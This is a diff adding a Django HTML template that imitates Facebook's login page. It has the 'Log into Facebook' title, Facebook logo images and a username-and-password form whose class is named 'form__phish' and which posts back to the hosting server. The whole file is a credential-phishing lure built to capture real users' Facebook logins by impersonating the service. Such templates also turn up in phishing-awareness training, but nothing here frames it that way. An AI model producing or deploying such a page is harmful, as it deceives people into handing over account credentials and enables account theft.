@@ -1,0 +1,32 @@
+{% load static %}
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log into Facebook</title>
+
+    <link rel="icon" type="image/facebook/x-icon" href="{% static 'images/facebook/facebook_logo_icon_147291.png' %}">
+    {% comment %} <link rel="stylesheet" href="{% static 'css/fb/default.css' %}"> {% endcomment %}
+    <link rel="stylesheet" href="{% static 'css/fb/styles.css' %}">
+
+</head>
+<body>
+    <div class='center'>
+        <div class='fb__content'>
+            <a href="/fb" class='a-img'><img alt="Logo" src="{% static 'images/facebook/fb.png' %}" /></a>
+
+            <form action="" method="POST" class='form__phish'>
+                {% csrf_token %}
+                <input type="text"
+                class="usernme-control" name="username" id="email" aria-describedby="helpId" placeholder="Mobile number or email address">
+                <input type="password"
+                class="password-control" name="password" id="password" aria-describedby="helpId" placeholder="Password">
+                <input type="button" value="Login" />
+            </form>
+        </div>
+    </div>
+</body>
+</html>
